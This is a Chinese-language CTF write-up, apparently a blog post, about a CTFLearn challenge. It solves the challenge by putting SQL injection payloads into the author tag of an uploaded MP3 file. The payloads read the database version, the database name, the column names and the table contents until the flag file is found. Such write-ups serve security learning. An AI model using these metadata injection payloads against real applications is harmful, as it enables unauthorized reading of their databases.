### MP3 元数据注入

话不多说，直接上题（CTFLearn）

![](https://pic1.imgdb.cn/item/682ec71a58cb8da5c8053779.png)

打开网站是个上传音频文件的功能

![](https://pic1.imgdb.cn/item/682ec72d58cb8da5c805378c.png)

只能上传 `.mp3` 文件

![](https://pic1.imgdb.cn/item/682ec75658cb8da5c80537cb.png)

我们尝试是否可以在 `exifdata` 中注入 SQL，结果确实可以

因为我们使用 easyTAG 修改元数据

您可以创建一个 `mp3` 包含以下元数据的语句：

```sql
title  = "" (leer)
author = a', (SELECT @@version))-- -b
```

这将创建以下语句

```sql
INSERT INTO audioedit (..., foo, bla, ...) VALUES (..., 'a', (SELECT @@version))-- -b',''...);
```

开头 `a` 和 `b` 结尾是必要的，因为第一个和最后一个字符被截断了

这给了我们数据库版本

```sql
5.5.49-0ubuntu0.14.04.1
```

接下来我们想知道数据库名称

```sql
author = a', (SELECT database()))-- -b:
audioedit
```

当然还有列名

```sql
author = a',(SELECT column_name FROM information_schema.columns WHERE table_name = 'audioedit' LIMIT x,1))-- -a
with x in range(0,3):
id
file
author
title
```

但是这给了我们一个插入错误！`:(`

问题是你不能同时从正在插入数据的数据库中进行选择

```sql
author = a',(SELECT author FROM audioedit.audioedit as blub LIMIT 0,1))-- -a:
ABCTF
author = a',(SELECT title FROM audioedit.audioedit as blub LIMIT 0,1))-- -a:
flag
author = a',(SELECT file FROM audioedit.audioedit as blub LIMIT 0,1))-- -a:
supersecretflagf1le.mp3
```

最后利用的URL是

```
https://web.ctflearn.com/audioedit/edit.php?file =supersecretflagf1le.mp3
```

![](https://pic1.imgdb.cn/item/682ecd0858cb8da5c8055651.png)

![](https://pic1.imgdb.cn/item/682ecd3d58cb8da5c80557d9.png)